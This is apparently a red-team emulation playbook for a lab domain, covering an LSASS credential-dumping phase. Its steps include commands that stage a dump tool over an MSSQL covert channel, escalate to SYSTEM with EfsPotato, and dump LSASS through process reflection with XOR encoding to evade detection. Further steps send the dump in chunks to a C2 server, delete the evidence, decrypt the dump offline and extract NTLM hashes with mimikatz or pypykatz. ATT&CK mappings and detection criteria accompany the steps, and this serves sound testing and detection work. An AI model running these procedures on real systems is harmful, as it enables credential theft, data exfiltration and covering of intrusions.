# Phase 3 - Credential Access: LSASS Reflection Dump via SYSTEM Context

<!-- CTI references used in this phase. Number them here; cite with [N] in the Reference Tables below. -->

---

## Step 0 - Setup

### Procedures

- Confirm Phase 2 completion - SYSTEM privilege verified on IIS01 (`C:\ProgramData\sys_out.txt` shows `SeDebugPrivilege` Enabled)
- Confirm `CertEnrollSvc.exe` is still present on IIS01 (not cleaned up between phases):

  ```
  xpfile exists C:\ProgramData\CertEnrollSvc.exe
  ```

- Build `ReflectDump.exe` if not already built - see [`resources/payloads/cred-access/LsassReflectDumping/Build.md`](../resources/payloads/cred-access/LsassReflectDumping/Build.md):

  ```cmd
  cd resources\payloads\cred-access\LsassReflectDumping\ReflectDump
  msbuild ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
  ```

  > Output: `ReflectDump\x64\Release\ReflectDump.exe`

- Stage `ReflectDump.exe` to the controlServer `toneshell` payloads subdirectory (required by `xpstage-hex`):

  ```bash
  cp resources/payloads/cred-access/LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/ReflectDump.exe
  ```

---

## Step 1 - Staging: Transfer ReflectDump.exe to IIS01 via MSSQL DB Channel

### Voice Track

With SYSTEM execution confirmed on IIS01, the adversary moves to the next objective: placing the credential dump tool on the target host without generating HTTP egress. The established covert database channel - proven in Phase 2 to deliver CertEnrollSvc.exe - is used a second time to transfer `ReflectDump.exe` directly into `sqlservr.exe`'s working context on IIS01. The operation leaves no lateral file copy, no PowerShell on IIS01, and no additional staging artifacts beyond what already exist in `C:\ProgramData\`.

### Procedures

1. ☣️ Stage `ReflectDump.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex ReflectDump.exe
   ```

   Same mechanism as Phase 2 Step 4A (hex variant):
   - controlServer hex-encodes `ReflectDump.exe`, generates INSERT SQL
   - SQL file pushed to `C:\Windows\Temp\` on WS01 as `stage_<id>.stl` (masquerade) via TONESHELL FILE_DOWNLOAD
   - WS01 `sqlcmd -i C:\Windows\Temp\stage_<id>.stl` bulk-INSERTs hex chunks into `tempdb..stg` on IIS01
   - T-SQL batch: hex concatenate → `CONVERT` to binary → `sp_OA` ADODB.Stream writes `ReflectDump.stl` to `C:\ProgramData\` → `sp_OA` FSO `MoveFile` renames it to `ReflectDump.exe` in the same batch - no PowerShell or `cmd.exe` spawn on IIS01
   - SQL file deleted from WS01; `tempdb..stg` dropped

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\ReflectDump.exe
     ```

2. Verify the binary landed on IIS01:

   ```
   xpfile exists C:\ProgramData\ReflectDump.exe
   ```

   - ***Expected Output***
     ```text
     File Exists  Directory Exists  Parent Directory Exists
     ----------- --------------- ----------------------
               1               0                       1
     ```

### Reference Tables

<!-- Mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT hex → T-SQL ADODB.Stream decode → cleanup) are identical to Phase 2 Step 4 (hex variant) and are not re-scored here. -->

---

## Step 2 - Credential Access: LSASS Reflection Dump via EfsPotato SYSTEM Context

### Voice Track

With `ReflectDump.exe` staged, the adversary re-uses the EfsPotato escalation chain from Phase 2 - this time with ReflectDump as the payload process. `CertEnrollSvc.exe` captures a SYSTEM impersonation token via named-pipe coercion and spawns `ReflectDump.exe` directly via `CreateProcessWithTokenW`, with no `cmd.exe` in the chain. Running as `NT AUTHORITY\SYSTEM`, the tool locates LSASS, opens a handle using a reflection-specific access mask, and forks a suspended reflection clone - avoiding the common Mimikatz and Task Manager access patterns. The full minidump is captured entirely into a heap buffer via a memory-only I/O callback, XOR-encrypted in-place, then flushed to `C:\ProgramData\DFxxxx.tmp`. The resulting file carries no MDMP signature and no plaintext credential strings. The dump path is written to `C:\ProgramData\rdump_out.txt` via the `-o` flag - no intermediate shell: `CertEnrollSvc.exe → ReflectDump.exe`. Harvesting LSASS material here enables the Domain Administrator Pass-the-Hash move to DC01 in Phase 4.

### Procedures

1. ☣️ Execute LSASS reflection dump via EfsPotato SYSTEM impersonation (fire-and-forget - dump takes ~30–60 s):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "C:\ProgramData\ReflectDump.exe -o C:\ProgramData\rdump_out.txt" lsarpc
   ```

   - `xprun` executes CertEnrollSvc.exe directly via sp_OA `WScript.Shell.Run` (ShellExecuteEx) - `sqlservr.exe → CertEnrollSvc.exe` with no intermediate `cmd.exe`
   - `CertEnrollSvc.exe` triggers EFS named-pipe coercion, captures SYSTEM token, spawns `ReflectDump.exe` directly via `CreateProcessWithTokenW` - no `cmd /c` wrapper, no `cmd.exe` in the chain
   - `ReflectDump.exe` runs as `NT AUTHORITY\SYSTEM`: queries own token, allocates heap, locates LSASS, opens handle `~0x4FA`, forks reflection clone via `RtlCreateProcessReflection`, dumps to heap via MiniDump callback, XOR-encrypts in-place, flushes to `C:\ProgramData\DFxxxx.tmp`
   - Reflection clone terminated; `-o` flag writes dump path directly to `C:\ProgramData\rdump_out.txt` (no shell redirect)
   - `xprun` with `bWaitOnReturn=1` blocks until CertEnrollSvc.exe exits (~30–60 s for dump)

   - ***Expected Output***
     ```text
     exit_code
     -----------
     0
     ```

2. Retrieve dump file path:

   ```
   xpfile cat C:\ProgramData\rdump_out.txt
   ```

   - ***Expected Output***
     ```text
     C:\ProgramData\DF1A2B.tmp
     ```

   > `GetTempFileNameW(L"C:\\ProgramData", L"DF", 0, ...)` generates `DFxxxx.tmp` (4-hex-digit suffix, no tilde prefix). Record the exact `DF` filename - the hex suffix is randomized per run.

3. Verify the dump file is non-zero size (~50–75 MB depending on LSASS working set):

   ```
   xpfile exists "C:\ProgramData\<DFxxxx.tmp from Step 2 output>"
   ```

   - ***Expected Output***
     ```text
     File Exists  Directory Exists  Parent Directory Exists
     ----------- --------------- ----------------------
               1               0                       1
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| ReflectDump.exe queries own token elevation as pre-flight check | Discovery | T1033 | System Owner/User Discovery | Windows | N/A - C2: `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY)` + `GetTokenInformation(TokenElevation)` is a pure in-process self-query - no external artifact, file, registry key, or network event produced; evaluator cannot independently verify the token-query step without trusting the binary; the process execution event itself is attributed to the EfsPotato CreateProcessWithTokenW spawn (T1106; Phase 2 Step 4B) | Not Calibrated - Not Benign | C2 | `ReflectDump.exe` calls token self-query on the current process to verify elevated context before any cross-process activity | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe LSASS memory access chain: pre-allocates 75 MB heap buffer, opens lsass.exe handle with reflection access mask ~0x4FA, forks suspended reflection clone via RtlCreateProcessReflection, and captures full minidump into heap via MiniDumpWriteDump IoWriteAllCallback | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `ReflectDump.exe` (child of `CertEnrollSvc.exe`, NT AUTHORITY\SYSTEM) opens `lsass.exe` with access mask `0x4FA` (`PROCESS_CREATE_PROCESS\|PROCESS_CREATE_THREAD\|PROCESS_DUP_HANDLE\|PROCESS_QUERY_INFORMATION\|PROCESS_VM_OPERATION\|PROCESS_VM_READ\|PROCESS_VM_WRITE` - composite REFLECT_ACCESS defined in source, not the common Mimikatz `0x1010` or `PROCESS_ALL_ACCESS 0x1FFFFF`) - Sysmon EC=10 on `lsass.exe` target, GrantedAccess=0x4FA; `RtlCreateProcessReflection` (resolved char-by-char from ntdll) then spawns a clone with `lsass.exe` as ParentProcessId - Sysmon EC=1; `MiniDumpWriteDump(MiniDumpWithFullMemory)` is called with file handle argument = NULL and a heap-resident `IoWriteAllCallback` - all minidump I/O goes to the 75 MB heap buffer, no Sysmon EC=11 at dump time | Calibrated - Not Benign | - | `ReflectDump.exe` (1) commits a 75 MB private heap region before any cross-process access; (2) calls `OpenProcess(~0x4FA)` on lsass.exe - reflection-specific mask, not full `0x1FFFFF` (Sysmon EC=10 on lsass.exe target); (3) `RtlCreateProcessReflection` forks a suspended clone - Sysmon EC=1 with lsass.exe as parent; (4) `MiniDumpWriteDump(MiniDumpWithFullMemory)` via `IoWriteAllCallback` writes exclusively to heap buffer - no file handle at dump time | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe enumerates processes to locate lsass.exe via EnumProcesses + PROCESS_QUERY_LIMITED_INFORMATION | Discovery | T1057 | Process Discovery | Windows | `ReflectDump.exe` calls `EnumProcesses` then `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid)` + `QueryFullProcessImageNameW` per PID in a tight loop to locate `lsass.exe` - when the loop reaches lsass.exe's PID, Sysmon EC=10 fires with GrantedAccess=0x1000 (`PROCESS_QUERY_LIMITED_INFORMATION`) on `lsass.exe` target; `CreateToolhelp32Snapshot` is deliberately avoided (source comment: "less-watched API path"); the 0x1000 access on lsass.exe occurs immediately before the separate 0x4FA REFLECT_ACCESS open attributed to T1003.001 | Not Calibrated - Not Benign | native-recon | `ReflectDump.exe` calls `EnumProcesses` + `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` per PID to locate `lsass.exe`; avoids Toolhelp32 snapshot | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe resolves RtlCreateProcessReflection and MiniDumpWriteDump via runtime char-arrays; loads dbghelp.dll via LoadLibraryA - all absent from static IAT | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | Two on-surface signals: (1) Sysmon EC=7 - `ReflectDump.exe` loads `dbghelp.dll` via `LoadLibraryA` at runtime (char array `'d','b','g','h','e','l','p','.','d','l','l'` in source); `dbghelp.dll` is absent from the binary's static import table - anomalous module load in an IIS01/MSSQL SYSTEM process context; (2) YARA / capability scan on the `ReflectDump.exe` binary: static PE import table contains no entry for `dbghelp.dll`, `MiniDumpWriteDump`, or `RtlCreateProcessReflection` - a sparse IAT for a process whose sole function involves those APIs; `RtlCreateProcessReflection` string built as inline char array (`'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n'`) and `MiniDumpWriteDump` similarly (`'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p'`) - both matchable as raw byte strings in the on-disk or in-memory PE image | Calibrated - Not Benign | - | API names `RtlCreateProcessReflection` (ntdll.dll) and `MiniDumpWriteDump` (dbghelp.dll) built char-by-char at runtime - absent from static PE import table; `dbghelp.dll` loaded via `LoadLibraryA` at runtime - module-load event (Sysmon EC=7) on `dbghelp.dll` in non-debug, non-sysadmin process context | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe creates suspended lsass.exe reflection clone via RtlCreateProcessReflection and terminates it via TerminateProcess after dump completes | Execution | T1106 | Native API | Windows | (1) `RtlCreateProcessReflection` (resolved char-by-char from ntdll via `GetProcAddress`) forks a lsass.exe clone with flag `RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES` (0x2) - new process appears in Sysmon EC=1 with `lsass.exe` (parent) → clone child process chain; `lsass.exe` should never spawn child processes in a clean environment; clone PID is sourced from `T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION.ReflectionClientId.UniqueProcess`; (2) `TerminateProcess(hReflectionProcess, 0)` terminates the clone after `MiniDumpWriteDump` completes - Sysmon EC=5 on the clone PID; handle is reused from the reflection info struct, so no second `OpenProcess` on the clone (no additional EC=10 event) | Calibrated - Not Benign | - | (1) `RtlCreateProcessReflection` (resolved char-by-char from ntdll) creates a suspended reflection clone of lsass.exe - Sysmon EC=1 with lsass.exe as parent, clone PID is the MiniDumpWriteDump target; (2) `TerminateProcess` called on clone handle after dump completes - Sysmon EC=5 on clone PID | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe writes XOR-encrypted dump buffer to C:\ProgramData\DFxxxx.tmp | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `ReflectDump.exe` (NT AUTHORITY\SYSTEM) applies position-dependent XOR in-place on the 75 MB heap buffer (`p[i] ^= (BYTE)((0xA3 + i * 0x5B) & 0xFF)` - fixed key, stripping MDMP magic bytes at offset 0: byte 0 `0x4D XOR 0xA3 = 0xEE`), then writes the result via `CreateFileW` to `C:\ProgramData\DFxxxx.tmp` - Sysmon EC=11 on SYSTEM account from `ReflectDump.exe`; the written file is ~50–75 MB with no valid MDMP or PE header at offset 0; YARA on disk: ~50–75 MB `.tmp` file in `C:\ProgramData\` lacking MDMP signature (`4D 44 4D 50`) at offset 0, written by a non-system process running as NT AUTHORITY\SYSTEM | Calibrated - Not Benign | - | Linear XOR `b ^ ((0xA3 + i * 0x5B) & 0xFF)` applied in-place on heap buffer, then flushed to `C:\ProgramData\DFxxxx.tmp`; path printed to stdout | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |
| ReflectDump.exe uses GetTempFileNameW to generate DFxxxx.tmp output filename blending with Windows API temp file pattern | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `ReflectDump.exe` generates output filename via `GetTempFileNameW(L"C:\\ProgramData", L"DF", 0, tmpFile)` - produces `DFxxxx.tmp` pattern (`DF` prefix + 4-hex-digit suffix + `.tmp`) matching Windows API temp file naming convention; Sysmon EC=11 on `C:\ProgramData\DF*.tmp` from `ReflectDump.exe` (NT AUTHORITY\SYSTEM); the written file is ~50–75 MB - anomalous against legitimate `DFxxxx.tmp` files which are sub-megabyte temporaries created by system processes, not by a SYSTEM-context reflection dump tool | Calibrated - Not Benign | - | `GetTempFileNameW(L"C:\\ProgramData", L"DF", 0, tmpFile)` generates `DFxxxx.tmp` filename blending with Windows API temp file naming; XOR-encrypted dump flushed to `C:\ProgramData\DFxxxx.tmp`; path printed to stdout | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | - |

---

## Step 3 - Collection: Dump Exfiltration via MSSQL DB Channel

### Voice Track

The encrypted dump in `C:\ProgramData\` cannot leave IIS01 directly - no HTTP egress and no trusted outbound path from that host to the attacker. The adversary routes it out through the existing MSSQL channel: the dump is read and chunked on IIS01 entirely within `sqlservr.exe`, PowerShell on WS01 assembles each chunk and writes it to local temp storage, and TONESHELL carries each piece back to the controlServer over the established C2 session. Once all chunks arrive, they are reassembled and the staging files on both IIS01 and WS01 are deleted. The final artifact - `rdump.tmp` on the attacker machine - is the XOR-encrypted LSASS minidump, ready for offline decryption.

### Procedures

1. ☣️ Exfil the encrypted dump from IIS01 to controlServer via OPENROWSET(BULK) + hex INSERT:

   ```
   xpexfil-hex C:\ProgramData\<DFxxxx.tmp from Step 2 output> rdump.tmp 600 8
   ```

   This performs:
   - Python queries file size via `OPENROWSET(BULK ... SINGLE_BLOB)` + `DATALENGTH` (native T-SQL, no process spawn on IIS01) to compute `num_chunks = ceil(file_size / 8 MB)`
   - `GRANT ADMINISTER BULK OPERATIONS TO [svc_app_dev]` via `EXECUTE AS LOGIN='sa'` - required because `OPENROWSET(BULK)` checks the original connection login's permissions, not the impersonation context (already granted in `xpinit`)
   - ONE T-SQL batch on IIS01 (no PowerShell): `OPENROWSET(BULK)` reads entire file → `SUBSTRING` per 8 MB chunk → `CONVERT(..., 2)` hex-encodes → INSERT 8000-char rows into `tempdb..exfil` with `chunk_idx`
   - Per file-chunk: WS01 PowerShell (TONESHELL EXEC) reads hex text via SqlClient `WHERE chunk_idx=N ORDER BY id`, concatenates via `StringBuilder`, writes `C:\Windows\Temp\rdump.tmp.hex{i}`
   - TONESHELL FILE_UPLOAD pulls hex file to `controlServer/files/rdump.tmp.hex{i}`; hex file deleted from WS01
   - After all chunks: `tempdb..exfil` dropped; Python `bytes.fromhex()` decodes each hex file to binary, assembles `files/rdump.tmp`; hex files removed

   - ***Expected Output***
     ```text
     [*] xpexfil-hex: 76343506 bytes → 10 chunk(s)
     [*] xpexfil-hex: T-SQL INSERT all 10 chunk(s) ...
     [*] xpexfil-hex: chunk 1/10 - extract + pull ...
     ...
     [*] xpexfil-hex: assembling 10 chunk(s) on C2 ...
     [+] xpexfil-hex done → controlServer/files/rdump.tmp
     ```

2. ☣️ Delete the dump file from IIS01 (requires SYSTEM - file is owned by NT AUTHORITY\SYSTEM):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\<DFxxxx.tmp from Step 2 output>" lsarpc
   ```

   > `xpfile del` returns `0x800A0046` Permission Denied on SYSTEM-owned files. EfsPotato escalation deletes under SYSTEM context.

3. ☣️ Delete the EfsPotato output file (also SYSTEM-owned):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\rdump_out.txt" lsarpc
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| OPENROWSET BULK DATALENGTH queries dump file size on IIS01 as pre-flight for exfil chunking | Discovery | T1083 | File and Directory Discovery | Windows | `sqlservr.exe` on IIS01 opens `C:\ProgramData\DFxxxx.tmp` for read access via `OPENROWSET(BULK ... SINGLE_BLOB)` + `DATALENGTH(BulkColumn)` - native T-SQL file-size query, same OPENROWSET mechanism as the main exfil read; no COM automation, no cmd.exe or powershell.exe spawn on IIS01 | Not Calibrated - Not Benign | staging | `_get_remote_file_size`: `SELECT DATALENGTH(BulkColumn) FROM OPENROWSET(BULK '...',SINGLE_BLOB)` via direct `sqlcmd -Q` from WS01; file size returned as SELECT result - single pre-flight query before chunked INSERT; no process spawn on IIS01 | IIS01 (10.12.10.20) | sa | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| Single T-SQL batch reads dump via OPENROWSET(BULK), hex-encodes in SUBSTRING chunks, and INSERTs into tempdb..exfil - entire operation in-process within sqlservr.exe, no process spawn on IIS01 | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `sqlservr.exe` on IIS01 opens `C:\ProgramData\DF*.tmp` for read access via OPENROWSET(BULK) - EDR file-read telemetry (Windows Object Access audit EC=4663 or equivalent EDR driver-level file-open event): `sqlservr.exe` reading a 50–75 MB `.tmp` file from `C:\ProgramData\` is anomalous; no legitimate MSSQL operation on this IIS01 SQL instance reads large binary `.tmp` files from `C:\ProgramData\`; preceding `GRANT ADMINISTER BULK OPERATIONS TO [svc_app_dev]` (SQL Server audit) is a corroborating pre-cursor | Calibrated - Not Benign | - | `EXECUTE AS LOGIN='sa'; GRANT ADMINISTER BULK OPERATIONS TO [svc_app_dev]` then single T-SQL batch: `OPENROWSET(BULK 'C:\ProgramData\DFxxxx.tmp',SINGLE_BLOB)` reads dump into `VARBINARY(MAX)`, WHILE loop `SUBSTRING(@data,@off,@len)` per 8 MB chunk → `CONVERT(VARCHAR(MAX),...,2)` hex-encodes → `INSERT INTO tempdb..exfil(chunk_idx,chunk) VALUES(@i,SUBSTRING(@hex,@j,8000))`; single blocking sqlcmd from WS01, no cmd.exe/powershell.exe on IIS01 | IIS01 (10.12.10.20) | sa (EXECUTE AS), svc_app_dev (OPENROWSET I/O) | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| WS01 PowerShell SqlClient reads hex text rows per chunk_idx from tempdb..exfil, concatenates via StringBuilder, writes raw hex string to C:\Windows\Temp\rdump.tmp.hex{i} | Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` spawned on WS01 (child of TONESHELL implant) with command line containing `New-Object System.Data.SqlClient.SqlConnection` and connection string targeting IIS01:1433/tempdb - Sysmon EC=1 (process creation with embedded SQL connection string in args); Sysmon EC=3 (outbound TCP from `powershell.exe` to IIS01:1433); PowerShell directly instantiating `SqlClient.SqlConnection` to a remote SQL server is not a baseline pattern on a domain workstation | Calibrated - Not Benign | - | Per chunk: WS01 PowerShell (TONESHELL EXEC) `SqlConnection` to IIS01:1433/tempdb, `SELECT chunk FROM tempdb..exfil WHERE chunk_idx=N ORDER BY id`, `StringBuilder.Append` per row, `[IO.File]::WriteAllText('C:\Windows\Temp\rdump.tmp.hex{i}')` - raw hex text only, no AES decryption | WS01 (10.12.10.30) | TESTLAB\labuser | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| WS01 PowerShell SqlClient reads hex text rows per chunk_idx from tempdb..exfil, concatenates via StringBuilder, writes raw hex string to C:\Windows\Temp\rdump.tmp.hex{i} | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `powershell.exe` on WS01 creates `C:\Windows\Temp\rdump.tmp.hex{i}` - Sysmon EC=11; file contains ~16 MB of ASCII hex text (characters 0–9, A–F only); filename pattern `rdump.tmp.hex\d+` in `C:\Windows\Temp\` is not a legitimate system temp file pattern; the file is created by the same PowerShell process that held an active `SqlClient` connection to IIS01:1433 immediately prior (Sysmon EC=3) | Calibrated - Not Benign | - | Per chunk: WS01 PowerShell (TONESHELL EXEC) `SqlConnection` to IIS01:1433/tempdb, `SELECT chunk FROM tempdb..exfil WHERE chunk_idx=N ORDER BY id`, `StringBuilder.Append` per row, `[IO.File]::WriteAllText('C:\Windows\Temp\rdump.tmp.hex{i}')` - raw hex text only, no AES decryption | WS01 (10.12.10.30) | TESTLAB\labuser | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| TONESHELL per-chunk FILE_UPLOAD streams rdump.tmp.hex{i} from WS01 to controlServer | Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | TONESHELL implant process on WS01 transmits `C:\Windows\Temp\rdump.tmp.hex{i}` contents over the established C2 channel - Sysmon EC=3 sustained large-volume outbound transfer (N × ~16 MB per 8 MB dump chunk) on the existing TONESHELL C2 session; total exfil volume ~152 MB (2 × 76 MB hex-encoded binary) across N sequential FILE_UPLOAD tasks; volume spike is anomalous relative to TONESHELL's typical beacon-size traffic pattern | Not Calibrated - Not Benign | transport | Per chunk: TONESHELL `FILE_UPLOAD` with `fileName=rdump.tmp.hex{i}` streams hex text from `C:\Windows\Temp\rdump.tmp.hex{i}` to `controlServer/files/rdump.tmp.hex{i}` over established C2 session; hex text is ~2x binary size (~16 MB per 8 MB file-chunk); N FILE_UPLOAD cycles for the full dump | WS01 (10.12.10.30) | TESTLAB\labuser | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| tempdb..exfil dropped on IIS01 after all hex chunks extracted | Stealth | T1070 | Indicator Removal | Windows | N/A - C3: `DROP TABLE tempdb..exfil` removes a SQL Server DDL object (in-memory database table in tempdb) - artifact has no file, registry, process, or distinctive network event on the declared Sysmon/EDR surface; SQL Server Extended Events or audit log would record the DDL statement but are off the Scenario 1 EDR surface profile; the final sqlcmd connection from WS01 is not distinguishable from preceding chunk-extract connections at the network layer | Not Calibrated - Not Benign | out-of-surface | `DROP TABLE tempdb..exfil` issued via sqlcmd after all WS01 chunk extractions complete - single cleanup at end (not per-chunk as in xpexfil) | IIS01 (10.12.10.20) | sa | - | - |
| TONESHELL cmd.exe deletes rdump.tmp.hex{i} hex staging files from WS01 per chunk after FILE_UPLOAD | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `cmd.exe` (child of TONESHELL implant) deletes `C:\Windows\Temp\rdump.tmp.hex{i}` per chunk immediately after TONESHELL FILE_UPLOAD - Sysmon EC=23, N sequential file-delete events on hex staging files (~16 MB each) | Not Calibrated - Not Benign | staging | Per chunk: `cmd /c del /f C:\Windows\Temp\rdump.tmp.hex{i}` (spawned by TONESHELL implant process) immediately after FILE_UPLOAD - N sequential deletions for N file-chunks | WS01 (10.12.10.30) | TESTLAB\labuser | [exfil.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/xp_mssql/exfil.py) | - |
| CertEnrollSvc.exe EfsPotato SYSTEM escalation deletes DFxxxx.tmp dump file and rdump_out.txt from IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs EfsPotato escalation then `cmd.exe /c del /f` as `NT AUTHORITY\SYSTEM` deletes `C:\ProgramData\DFxxxx.tmp` (~50–75 MB encrypted dump) and `C:\ProgramData\rdump_out.txt` - Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image; `xpfile del` (sp_OA FSO) fails with `0x800A0046` on SYSTEM-owned files | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f ..." lsarpc` × 2 - EfsPotato SYSTEM escalation required for each deletion because both `DFxxxx.tmp` and `rdump_out.txt` are SYSTEM-owned; same escalation chain as Phase 2 Step 4 T1134.001/T1134.002 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |

---

## Step 4 - Credential Access: Offline Decryption and Credential Parsing

### Voice Track

With `rdump.tmp` on the attacker machine, the adversary decrypts the XOR-encoded dump using the shared linear-key decoder - the same scheme documented in the LsassReflectDumping README and applied consistently across NtdsRawDump and CWLHerpaderping artifacts in this plan. Once the MDMP header is restored, the dump is parsed offline with `pypykatz` or `Mimikatz sekurlsa::minidump` - no network connection to the lab required. The adversary extracts NTLM hashes, Kerberos TGT material, and any cleartext credentials still retained in LSASS (WDigest cached entries or SSP-forwarded credentials), targeting domain administrator and privileged service account material needed for subsequent phases. Dump files are deleted from the attacker machine after credential extraction.

### Procedures

1. Decrypt the XOR-encoded dump on the attacker machine:

   ```python
   python3 -c "
   import sys
   data = open('rdump.tmp', 'rb').read()
   open('lsass.dmp', 'wb').write(
       bytes(b ^ ((0xA3 + i * 0x5B) & 0xFF) for i, b in enumerate(data))
   )"
   ```

2. ☣️ Parse credential material from the restored minidump:

   ```bash
   pypykatz lsa minidump lsass.dmp
   ```

   Or via Mimikatz:

   ```
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonPasswords full
   ```

   - ***Expected Output*** (relevant excerpt)
     ```text
     Authentication Id : 0 ; 123456 (00000000:0001e240)
     Session           : Interactive from 1
     UserName          : Administrator
     Domain            : TESTLAB
     LogonType         : Interactive
     ...
     MSV:
       [00000003] Primary
       * Username : Administrator
       * Domain   : TESTLAB
       * NTLM     : <hash>
       * SHA1     : <hash>
     Kerberos:
       * Username : Administrator
       * Domain   : TESTLAB.LOCAL
       * Password : (null)
     ```

3. Record harvested domain administrator NTLM hash and any cleartext credentials for use in Phase 4.

4. Delete dump files from the attacker machine:

   ```bash
   rm rdump.tmp lsass.dmp
   ```

### Reference Tables

<!-- All Step 4 behaviors execute on the attacker machine (outside the lab). Off the declared Surface Profile - not scored. -->

---
